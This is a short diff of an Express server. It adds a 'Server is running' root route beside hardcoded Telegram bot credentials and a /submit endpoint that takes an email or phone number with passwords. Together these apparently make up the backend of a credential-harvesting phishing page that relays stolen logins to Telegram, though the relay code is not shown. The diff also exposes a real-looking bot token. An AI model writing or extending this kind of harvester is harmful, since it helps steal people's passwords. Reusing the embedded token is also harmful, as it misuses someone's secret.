@@ -8,7 +8,7 @@ app.use(express.json());
 
 const TELEGRAM_BOT_TOKEN = "7680942195:AAEfRFfgfcJXPAAlWu8W9Qq21Bpuv75JxsM";
 const TELEGRAM_CHAT_ID = "7074446840";
-
+app.get("/", (req, res) => {res.send("Server is running");});
 app.post("/submit", async (req, res) => {
   try {
     // expect either email or phone along with passwords
